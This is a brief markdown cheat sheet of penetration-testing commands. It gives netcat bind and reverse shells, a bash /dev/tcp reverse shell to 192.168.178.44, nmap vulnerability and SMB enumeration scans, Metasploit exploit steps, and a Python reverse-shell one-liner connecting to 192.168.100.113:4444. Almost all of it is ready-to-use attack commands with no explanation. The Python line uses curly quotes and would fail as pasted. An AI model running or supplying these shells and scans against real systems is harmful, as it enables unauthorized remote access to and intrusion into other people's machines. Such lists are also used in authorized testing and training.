## netcat

```
nc -lnvp 87 -s 192.168.178.44

nc -l -p 87 -e /bin/bash

nc 192.168.178.44 87 -e /bin/bash


nc -lvp 87

bash -i >& /dev/tcp/192.168.178.44/87 0>&1 
```
## nmap
```
nmap --script vulners -oX file.xml <target>

nmap -p 80 --script vulners <target>

nmap -sV --script vulners <target>

nmap -p139,445 <target> -sV
```
##### attack specific services
```
nmap -p139,445 --script smb-os-discovery,smb-enum-shares-smb-enum-users <target>
```

## metasploit
```
msfconsole

msf6 > use <number of exploit>

msf6 exploit(content) > show options
msf6 exploit(content) > set RHOST <target>
msf6 exploit(content) > exploit

pwd&whoami 
```
python reverse shell
```
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```
